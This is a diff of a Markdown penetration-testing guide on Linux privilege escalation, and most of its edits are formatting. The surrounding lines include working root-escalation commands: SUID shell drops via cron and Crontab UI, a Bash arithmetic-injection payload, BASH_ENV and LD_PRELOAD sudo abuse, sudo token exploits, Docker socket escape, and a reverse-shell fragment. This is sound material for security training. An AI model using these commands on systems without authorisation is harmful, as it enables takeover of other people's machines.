@@ -1,6 +1,6 @@
 # Linux Privilege Escalation
 
-{{#include ../../banners/hacktricks-training.md}}
+\{{#include ../../banners/hacktricks-training.md\}}
 
 ## System Information
 
@@ -59,9 +59,7 @@ Always **search the kernel version in Google**, maybe your kernel version is wri
 
 Additional kernel exploitation technique:
 
-{{#ref}}
-../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
-{{#endref}}
+\{{#ref\}} ../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md \{{#endref\}}
 
 ### CVE-2016-5195 (DirtyCow)
 
@@ -91,9 +89,9 @@ sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.
 
 ### Sudo < 1.9.17p1
 
-Sudo versions before 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) allows unprivileged local users to escalate their privileges to root via sudo `--chroot` option when `/etc/nsswitch.conf` file is used from a user controlled directory.  
+Sudo versions before 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) allows unprivileged local users to escalate their privileges to root via sudo `--chroot` option when `/etc/nsswitch.conf` file is used from a user controlled directory.
 
-Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Before running the exploit, make sure that your `sudo` version is vulnerable and that it supports the `chroot` feature.  
+Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Before running the exploit, make sure that your `sudo` version is vulnerable and that it supports the `chroot` feature.
 
 For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
 
@@ -173,10 +171,7 @@ cat /proc/sys/kernel/randomize_va_space 2>/dev/null
 
 If you are inside a docker container you can try to escape from it:
 
-
-{{#ref}}
-docker-security/
-{{#endref}}
+\{{#ref\}} docker-security/ \{{#endref\}}
 
 ## Drives
 
@@ -215,7 +210,7 @@ rpm -qa #Centos
 
 If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.
 
-> [!NOTE] > _Note that these commands will show a lot of information that will mostly be useless, therefore it's recommended some applications like OpenVAS or similar that will check if any installed software version is vulnerable to known exploits_
+> \[!NOTE] > _Note that these commands will show a lot of information that will mostly be useless, therefore it's recommended some applications like OpenVAS or similar that will check if any installed software version is vulnerable to known exploits_
 
 ## Processes
 
@@ -240,15 +235,14 @@ Some services of a server save **credentials in clear text inside the memory**.\
 Normally you will need **root privileges** to read the memory of processes that belong to other users, therefore this is usually more useful when you are already root and want to discover more credentials.\
 However, remember that **as a regular user you can read the memory of the processes you own**.
 
-> [!WARNING]
-> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
+> \[!WARNING] Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
 >
-> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
+> The file _**/proc/sys/kernel/yama/ptrace\_scope**_ controls the accessibility of ptrace:
 >
-> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
-> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
-> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
-> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.
+> * **kernel.yama.ptrace\_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
+> * **kernel.yama.ptrace\_scope = 1**: only a parent process can be debugged.
+> * **kernel.yama.ptrace\_scope = 2**: Only admin can use ptrace, as it required CAP\_SYS\_PTRACE capability.
+> * **kernel.yama.ptrace\_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.
 
 #### GDB
 
@@ -337,9 +331,9 @@ Press Ctrl-C to end monitoring without terminating the process.
 
 To dump a process memory you could use:
 
-- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
-- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_You can manually remove root requirements and dump the process owned by you
-- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root is required)
+* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
+* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_You can manually remove root requirements and dump the process owned by you
+* Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root is required)
 
 ### Credentials from Process Memory
 
@@ -395,33 +389,38 @@ Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
 If a web “Crontab UI” panel (alseambusher/crontab-ui) runs as root and is only bound to loopback, you can still reach it via SSH local port-forwarding and create a privileged job to escalate.
 
 Typical chain
-- Discover loopback-only port (e.g., 127.0.0.1:8000) and Basic-Auth realm via `ss -ntlp` / `curl -v localhost:8000`
-- Find credentials in operational artifacts:
-  - Backups/scripts with `zip -P <password>`
-  - systemd unit exposing `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
-- Tunnel and login:
+
+* Discover loopback-only port (e.g., 127.0.0.1:8000) and Basic-Auth realm via `ss -ntlp` / `curl -v localhost:8000`
+* Find credentials in operational artifacts:
+  * Backups/scripts with `zip -P <password>`
+  * systemd unit exposing `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
+* Tunnel and login:
+
 ```bash
 ssh -L 9001:localhost:8000 user@target
 # browse http://localhost:9001 and authenticate
 ```
-- Create a high-priv job and run immediately (drops SUID shell):
+
+* Create a high-priv job and run immediately (drops SUID shell):
+
 ```bash
 # Name: escalate
 # Command:
 cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
 ```
-- Use it:
+
+* Use it:
+
 ```bash
 /tmp/rootshell -p   # root shell
 ```
 
 Hardening
-- Do not run Crontab UI as root; constrain with a dedicated user and minimal permissions
-- Bind to localhost and additionally restrict access via firewall/VPN; do not reuse passwords
-- Avoid embedding secrets in unit files; use secret stores or root-only EnvironmentFile
-- Enable audit/logging for on-demand job executions
 
-
+* Do not run Crontab UI as root; constrain with a dedicated user and minimal permissions
+* Bind to localhost and additionally restrict access via firewall/VPN; do not reuse passwords
+* Avoid embedding secrets in unit files; use secret stores or root-only EnvironmentFile
+* Enable audit/logging for on-demand job executions
 
 Check if any scheduled job is vulnerable. Maybe you can take advantage of a script being executed by root (wildcard vuln? can modify files that root uses? use symlinks? create specific files in the directory that root uses?).
 
@@ -458,34 +457,30 @@ rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh mys
 
 Read the following page for more wildcard exploitation tricks:
 
-
-{{#ref}}
-wildcards-spare-tricks.md
-{{#endref}}
-
+\{{#ref\}} wildcards-spare-tricks.md \{{#endref\}}
 
 ### Bash arithmetic expansion injection in cron log parsers
 
 Bash performs parameter expansion and command substitution before arithmetic evaluation in ((...)), $((...)) and let. If a root cron/parser reads untrusted log fields and feeds them into an arithmetic context, an attacker can inject a command substitution $(...) that executes as root when the cron runs.
 
-- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. So a value like `$(/bin/bash -c 'id > /tmp/pwn')0` is first substituted (running the command), then the remaining numeric `0` is used for the arithmetic so the script continues without errors.
+* Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. So a value like `$(/bin/bash -c 'id > /tmp/pwn')0` is first substituted (running the command), then the remaining numeric `0` is used for the arithmetic so the script continues without errors.
+*   Typical vulnerable pattern:
 
-- Typical vulnerable pattern:
-  ```bash
-  #!/bin/bash
-  # Example: parse a log and "sum" a count field coming from the log
-  while IFS=',' read -r ts user count rest; do
-      # count is untrusted if the log is attacker-controlled
-      (( total += count ))     # or: let "n=$count"
-  done < /var/www/app/log/application.log
-  ```
+    ```bash
+    #!/bin/bash
+    # Example: parse a log and "sum" a count field coming from the log
+    while IFS=',' read -r ts user count rest; do
+        # count is untrusted if the log is attacker-controlled
+        (( total += count ))     # or: let "n=$count"
+    done < /var/www/app/log/application.log
+    ```
+*   Exploitation: Get attacker-controlled text written into the parsed log so that the numeric-looking field contains a command substitution and ends with a digit. Ensure your command does not print to stdout (or redirect it) so the arithmetic remains valid.
 
-- Exploitation: Get attacker-controlled text written into the parsed log so that the numeric-looking field contains a command substitution and ends with a digit. Ensure your command does not print to stdout (or redirect it) so the arithmetic remains valid.
-  ```bash
-  # Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
-  $(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
-  # When the root cron parser evaluates (( total += count )), your command runs as root.
-  ```
+    ```bash
+    # Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
+    $(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
+    # When the root cron parser evaluates (( total += count )), your command runs as root.
+    ```
 
 ### Cron script overwriting and symlink
 
@@ -578,8 +573,8 @@ In the documentation you can read what the Unit is:
 
 Therefore, to abuse this permission you would need to:
 
-- Find some systemd unit (like a `.service`) that is **executing a writable binary**
-- Find some systemd unit that is **executing a relative path** and you have **writable privileges** over the **systemd PATH** (to impersonate that executable)
+* Find some systemd unit (like a `.service`) that is **executing a writable binary**
+* Find some systemd unit that is **executing a relative path** and you have **writable privileges** over the **systemd PATH** (to impersonate that executable)
 
 **Learn more about timers with `man systemd.timer`.**
 
@@ -602,16 +597,16 @@ Sockets can be configured using `.socket` files.
 
 **Learn more about sockets with `man systemd.socket`.** Inside this file, several interesting parameters can be configured:
 
-- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: These options are different but a summary is used to **indicate where it is going to listen** to the socket (the path of the AF_UNIX socket file, the IPv4/6 and/or port number to listen, etc.)
-- `Accept`: Takes a boolean argument. If **true**, a **service instance is spawned for each incoming connection** and only the connection socket is passed to it. If **false**, all listening sockets themselves are **passed to the started service unit**, and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic. **Defaults to false**. For performance reasons, it is recommended to write new daemons only in a way that is suitable for `Accept=no`.
-- `ExecStartPre`, `ExecStartPost`: Takes one or more command lines, which are **executed before** or **after** the listening **sockets**/FIFOs are **created** and bound, respectively. The first token of the command line must be an absolute filename, then followed by arguments for the process.
-- `ExecStopPre`, `ExecStopPost`: Additional **commands** that are **executed before** or **after** the listening **sockets**/FIFOs are **closed** and removed, respectively.
-- `Service`: Specifies the **service** unit name **to activate** on **incoming traffic**. This setting is only allowed for sockets with Accept=no. It defaults to the service that bears the same name as the socket (with the suffix replaced). In most cases, it should not be necessary to use this option.
+* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: These options are different but a summary is used to **indicate where it is going to listen** to the socket (the path of the AF\_UNIX socket file, the IPv4/6 and/or port number to listen, etc.)
+* `Accept`: Takes a boolean argument. If **true**, a **service instance is spawned for each incoming connection** and only the connection socket is passed to it. If **false**, all listening sockets themselves are **passed to the started service unit**, and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic. **Defaults to false**. For performance reasons, it is recommended to write new daemons only in a way that is suitable for `Accept=no`.
+* `ExecStartPre`, `ExecStartPost`: Takes one or more command lines, which are **executed before** or **after** the listening **sockets**/FIFOs are **created** and bound, respectively. The first token of the command line must be an absolute filename, then followed by arguments for the process.
+* `ExecStopPre`, `ExecStopPost`: Additional **commands** that are **executed before** or **after** the listening **sockets**/FIFOs are **closed** and removed, respectively.
+* `Service`: Specifies the **service** unit name **to activate** on **incoming traffic**. This setting is only allowed for sockets with Accept=no. It defaults to the service that bears the same name as the socket (with the suffix replaced). In most cases, it should not be necessary to use this option.
 
 ### Writable .socket files
 
 If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
-_Note that the system must be using that socket file configuration or the backdoor won't be executed_
+&#xNAN;_&#x4E;ote that the system must be using that socket file configuration or the backdoor won't be executed_
 
 ### Writable sockets
 
@@ -636,10 +631,7 @@ socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of 
 
 **Exploitation example:**
 
-
-{{#ref}}
-socket-command-injection.md
-{{#endref}}
+\{{#ref\}} socket-command-injection.md \{{#endref\}}
 
 ### HTTP sockets
 
@@ -675,7 +667,6 @@ In cases where the Docker CLI isn't available, the Docker socket can still be ma
     ```bash
     curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
     ```
-
 2.  **Create a Container:** Send a request to create a container that mounts the host system's root directory.
 
     ```bash
@@ -687,7 +678,6 @@ In cases where the Docker CLI isn't available, the Docker socket can still be ma
     ```bash
     curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
     ```
-
 3.  **Attach to the Container:** Use `socat` to establish a connection to the container, enabling command execution within it.
 
     ```bash
@@ -706,28 +696,19 @@ Note that if you have write permissions over the docker socket because you are *
 
 Check **more ways to break out from docker or abuse it to escalate privileges** in:
 
-
-{{#ref}}
-docker-security/
-{{#endref}}
+\{{#ref\}} docker-security/ \{{#endref\}}
 
 ## Containerd (ctr) privilege escalation
 
 If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:
 
-
-{{#ref}}
-containerd-ctr-privilege-escalation.md
-{{#endref}}
+\{{#ref\}} containerd-ctr-privilege-escalation.md \{{#endref\}}
 
 ## **RunC** privilege escalation
 
 If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:
 
-
-{{#ref}}
-runc-privilege-escalation.md
-{{#endref}}
+\{{#ref\}} runc-privilege-escalation.md \{{#endref\}}
 
 ## **D-Bus**
 
@@ -752,10 +733,7 @@ Policies without a specified user or group apply universally, while "default" co
 
 **Learn how to enumerate and exploit a D-Bus communication here:**
 
-
-{{#ref}}
-d-bus-enumeration-and-command-injection-privilege-escalation.md
-{{#endref}}
+\{{#ref\}} d-bus-enumeration-and-command-injection-privilege-escalation.md \{{#endref\}}
 
 ## **Network**
 
@@ -833,17 +811,14 @@ gpg --list-keys 2>/dev/null
 
 ### Big UID
 
-Some Linux versions were affected by a bug that allows users with **UID > INT_MAX** to escalate privileges. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
+Some Linux versions were affected by a bug that allows users with **UID > INT\_MAX** to escalate privileges. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
 **Exploit it** using: **`systemd-run -t /bin/bash`**
 
 ### Groups
 
 Check if you are a **member of some group** that could grant you root privileges:
 
-
-{{#ref}}
-interesting-groups-linux-pe/
-{{#endref}}
+\{{#ref\}} interesting-groups-linux-pe/ \{{#endref\}}
 
 ### Clipboard
 
@@ -933,17 +908,15 @@ This example, **based on HTB machine Admirer**, was **vulnerable** to **PYTHONPA
 sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
 ```
 
-### BASH_ENV preserved via sudo env_keep → root shell
+### BASH\_ENV preserved via sudo env\_keep → root shell
 
 If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.
 
-- Why it works: For non-interactive shells, Bash evaluates `$BASH_ENV` and sources that file before running the target script. Many sudo rules allow running a script or a shell wrapper. If `BASH_ENV` is preserved by sudo, your file is sourced with root privileges.
-
-- Requirements:
-  - A sudo rule you can run (any target that invokes `/bin/bash` non-interactively, or any bash script).
-  - `BASH_ENV` present in `env_keep` (check with `sudo -l`).
-
-- PoC:
+* Why it works: For non-interactive shells, Bash evaluates `$BASH_ENV` and sources that file before running the target script. Many sudo rules allow running a script or a shell wrapper. If `BASH_ENV` is preserved by sudo, your file is sourced with root privileges.
+* Requirements:
+  * A sudo rule you can run (any target that invokes `/bin/bash` non-interactively, or any bash script).
+  * `BASH_ENV` present in `env_keep` (check with `sudo -l`).
+* PoC:
 
 ```bash
 cat > /dev/shm/shell.sh <<'EOF'
@@ -955,10 +928,10 @@ BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/
 # You should now have a root shell
 ```
 
-- Hardening:
-  - Remove `BASH_ENV` (and `ENV`) from `env_keep`, prefer `env_reset`.
-  - Avoid shell wrappers for sudo-allowed commands; use minimal binaries.
-  - Consider sudo I/O logging and alerting when preserved env vars are used.
+* Hardening:
+  * Remove `BASH_ENV` (and `ENV`) from `env_keep`, prefer `env_reset`.
+  * Avoid shell wrappers for sudo-allowed commands; use minimal binaries.
+  * Consider sudo I/O logging and alerting when preserved env vars are used.
 
 ### Sudo execution bypassing paths
 
@@ -1010,16 +983,16 @@ export -f /usr/sbin/service
 
 Then, when you call the suid binary, this function will be executed
 
-### LD_PRELOAD & **LD_LIBRARY_PATH**
+### LD\_PRELOAD & **LD\_LIBRARY\_PATH**
 
-The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.
+The **LD\_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.
 
 However, to maintain system security and prevent this feature from being exploited, particularly with **suid/sgid** executables, the system enforces certain conditions:
 
-- The loader disregards **LD_PRELOAD** for executables where the real user ID (_ruid_) does not match the effective user ID (_euid_).
-- For executables with suid/sgid, only libraries in standard paths that are also suid/sgid are preloaded.
+* The loader disregards **LD\_PRELOAD** for executables where the real user ID (_ruid_) does not match the effective user ID (_euid_).
+* For executables with suid/sgid, only libraries in standard paths that are also suid/sgid are preloaded.
 
-Privilege escalation can occur if you have the ability to execute commands with `sudo` and the output of `sudo -l` includes the statement **env_keep+=LD_PRELOAD**. This configuration allows the **LD_PRELOAD** environment variable to persist and be recognized even when commands are run with `sudo`, potentially leading to the execution of arbitrary code with elevated privileges.
+Privilege escalation can occur if you have the ability to execute commands with `sudo` and the output of `sudo -l` includes the statement **env\_keep+=LD\_PRELOAD**. This configuration allows the **LD\_PRELOAD** environment variable to persist and be recognized even when commands are run with `sudo`, potentially leading to the execution of arbitrary code with elevated privileges.
 
 ```
 Defaults        env_keep += LD_PRELOAD
@@ -1053,8 +1026,7 @@ Finally, **escalate privileges** running
 sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
 ```
 
-> [!CAUTION]
-> A similar privesc can be abused if the attacker controls the **LD_LIBRARY_PATH** env variable because he controls the path where libraries are going to be searched.
+> \[!CAUTION] A similar privesc can be abused if the attacker controls the **LD\_LIBRARY\_PATH** env variable because he controls the path where libraries are going to be searched.
 
 ```c
 #include <stdio.h>
@@ -1084,7 +1056,7 @@ When encountering a binary with **SUID** permissions that seems unusual, it's a 
 strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
 ```
 
-For instance, encountering an error like _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ suggests a potential for exploitation.
+For instance, encountering an error like _"open(“/path/to/.config/libcalc.so”, O\_RDONLY) = -1 ENOENT (No such file or directory)"_ suggests a potential for exploitation.
 
 To exploit this, one would proceed by creating a C file, say _"/path/to/.config/libcalc.c"_, containing the following code:
 
@@ -1155,15 +1127,9 @@ The project collects legitimate functions of Unix binaries that can be abused to
 > strace -o /dev/null /bin/sh\
 > sudo awk 'BEGIN {system("/bin/sh")}'
 
+\{{#ref\}} https://gtfobins.github.io/ \{{#endref\}}
 
-{{#ref}}
-https://gtfobins.github.io/
-{{#endref}}
-
-
-{{#ref}}
-https://gtfoargs.github.io/
-{{#endref}}
+\{{#ref\}} https://gtfoargs.github.io/ \{{#endref\}}
 
 ### FallOfSudo
 
@@ -1175,16 +1141,16 @@ In cases where you have **sudo access** but not the password, you can escalate p
 
 Requirements to escalate privileges:
 
-- You already have a shell as user "_sampleuser_"
-- "_sampleuser_" have **used `sudo`** to execute something in the **last 15mins** (by default that's the duration of the sudo token that allows us to use `sudo` without introducing any password)
-- `cat /proc/sys/kernel/yama/ptrace_scope` is 0
-- `gdb` is accessible (you can be able to upload it)
+* You already have a shell as user "_sampleuser_"
+* "_sampleuser_" have **used `sudo`** to execute something in the **last 15mins** (by default that's the duration of the sudo token that allows us to use `sudo` without introducing any password)
+* `cat /proc/sys/kernel/yama/ptrace_scope` is 0
+* `gdb` is accessible (you can be able to upload it)
 
 (You can temporarily enable `ptrace_scope` with `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` or permanently modifying `/etc/sysctl.d/10-ptrace.conf` and setting `kernel.yama.ptrace_scope = 0`)
 
-If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)
+If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo_inject)
 
-- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
+* The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
 
 ```bash
 bash exploit.sh
@@ -1192,14 +1158,14 @@ bash exploit.sh
 sudo su
 ```
 
-- The **second exploit** (`exploit_v2.sh`) will create a sh shell in _/tmp_ **owned by root with setuid**
+* The **second exploit** (`exploit_v2.sh`) will create a sh shell in _/tmp_ **owned by root with setuid**
 
 ```bash
 bash exploit_v2.sh
 /tmp/sh -p
 ```
 
-- The **third exploit** (`exploit_v3.sh`) will **create a sudoers file** that makes **sudo tokens eternal and allows all users to use sudo**
+* The **third exploit** (`exploit_v3.sh`) will **create a sudoers file** that makes **sudo tokens eternal and allows all users to use sudo**
 
 ```bash
 bash exploit_v3.sh
@@ -1208,7 +1174,7 @@ sudo su
 
 ### /var/run/sudo/ts/\<Username>
 
-If you have **write permissions** in the folder or on any of the created files inside the folder you can use the binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) to **create a sudo token for a user and PID**.\
+If you have **write permissions** in the folder or on any of the created files inside the folder you can use the binary [**write\_sudo\_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) to **create a sudo token for a user and PID**.\
 For example, if you can overwrite the file _/var/run/sudo/ts/sampleuser_ and you have a shell as that user with PID 1234, you can **obtain sudo privileges** without needing to know the password doing:
 
 ```bash
@@ -1251,7 +1217,7 @@ permit nopass demo as root cmd vim
 
 ### Sudo Hijacking
 
-If you know that a **user usually connects to a machine and uses `sudo`** to escalate privileges and you got a shell within that user context, you can **create a new sudo executable** that will execute your code as root and then the user's command. Then, **modify the $PATH** of the user context (for example adding the new path in .bash_profile) so when the user executes sudo, your sudo executable is executed.
+If you know that a **user usually connects to a machine and uses `sudo`** to escalate privileges and you got a shell within that user context, you can **create a new sudo executable** that will execute your code as root and then the user's command. Then, **modify the $PATH** of the user context (for example adding the new path in .bash\_profile) so when the user executes sudo, your sudo executable is executed.
 
 Note that if the user uses a different shell (not bash) you will need to modify other files to add the new path. For example[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifies `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. You can find another example in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)
 
@@ -1283,10 +1249,7 @@ That means that the configuration files from `/etc/ld.so.conf.d/*.conf` will be 
 If for some reason **a user has write permissions** on any of the paths indicated: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, any file inside `/etc/ld.so.conf.d/` or any folder within the config file inside `/etc/ld.so.conf.d/*.conf` he may be able to escalate privileges.\
 Take a look at **how to exploit this misconfiguration** in the following page:
 
-
-{{#ref}}
-ld.so.conf-example.md
-{{#endref}}
+\{{#ref\}} ld.so.conf-example.md \{{#endref\}}
 
 ### RPATH
 
@@ -1332,10 +1295,7 @@ int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp
 Linux capabilities provide a **subset of the available root privileges to a process**. This effectively breaks up root **privileges into smaller and distinctive units**. Each of these units can then be independently granted to processes. This way the full set of privileges is reduced, decreasing the risks of exploitation.\
 Read the following page to **learn more about capabilities and how to abuse them**:
 
-
-{{#ref}}
-linux-capabilities.md
-{{#endref}}
+\{{#ref\}} linux-capabilities.md \{{#endref\}}
 
 ## Directory permissions
 
@@ -1375,7 +1335,7 @@ screen -ls
 screen -ls <username>/ # Show another user' screen sessions
 ```
 
-![](<../../images/image (141).png>)
+![](<../../../.gitbook/assets/image (141).png>)
 
 **Attach to a session**
 
@@ -1397,7 +1357,7 @@ ps aux | grep tmux #Search for tmux consoles not using default folder for socket
 tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
 ```
 
-![](<../../images/image (837).png>)
+![](<../../../.gitbook/assets/image (837).png>)
 
 **Attach to a session**
 
@@ -1422,18 +1382,18 @@ This bug is caused when creating a new ssh key in those OS, as **only 32,768 var
 
 ### SSH Interesting configuration values
 
-- **PasswordAuthentication:** Specifies whether password authentication is allowed. The default is `no`.
-- **PubkeyAuthentication:** Specifies whether public key authentication is allowed. The default is `yes`.
-- **PermitEmptyPasswords**: When password authentication is allowed, it specifies whether the server allows login to accounts with empty password strings. The default is `no`.
+* **PasswordAuthentication:** Specifies whether password authentication is allowed. The default is `no`.
+* **PubkeyAuthentication:** Specifies whether public key authentication is allowed. The default is `yes`.
+* **PermitEmptyPasswords**: When password authentication is allowed, it specifies whether the server allows login to accounts with empty password strings. The default is `no`.
 
 ### PermitRootLogin
 
 Specifies whether root can log in using ssh, default is `no`. Possible values:
 
-- `yes`: root can login using password and private key
-- `without-password` or `prohibit-password`: root can only login with a private key
-- `forced-commands-only`: Root can login only using private key and if the commands options are specified
-- `no` : no
+* `yes`: root can login using password and private key
+* `without-password` or `prohibit-password`: root can only login with a private key
+* `forced-commands-only`: Root can login only using private key and if the commands options are specified
+* `no` : no
 
 ### AuthorizedKeysFile
 
@@ -1463,10 +1423,7 @@ The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding wit
 
 If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:
 
-
-{{#ref}}
-ssh-forward-agent-exploitation.md
-{{#endref}}
+\{{#ref\}} ssh-forward-agent-exploitation.md \{{#endref\}}
 
 ## Interesting Files
 
@@ -1583,7 +1540,7 @@ find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -p
 find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
 ```
 
-### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files
+### \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files
 
 ```bash
 find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
@@ -1666,10 +1623,9 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 
 ### Logrotate exploitation
 
-A vulnerability in `logrotate` lets users with **write permissions** on a log file or its parent directories potentially gain escalated privileges. This is because `logrotate`, often running as **root**, can be manipulated to execute arbitrary files, especially in directories like _**/etc/bash_completion.d/**_. It's important to check permissions not just in _/var/log_ but also in any directory where log rotation is applied.
+A vulnerability in `logrotate` lets users with **write permissions** on a log file or its parent directories potentially gain escalated privileges. This is because `logrotate`, often running as **root**, can be manipulated to execute arbitrary files, especially in directories like _**/etc/bash\_completion.d/**_. It's important to check permissions not just in _/var/log_ but also in any directory where log rotation is applied.
 
-> [!TIP]
-> This vulnerability affects `logrotate` version `3.18.0` and older
+> \[!TIP] This vulnerability affects `logrotate` version `3.18.0` and older
 
 More detailed information about the vulnerability can be found on this page: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).
 
@@ -1679,7 +1635,7 @@ This vulnerability is very similar to [**CVE-2016-1247**](https://www.cvedetails
 
 ### /etc/sysconfig/network-scripts/ (Centos/Redhat)
 
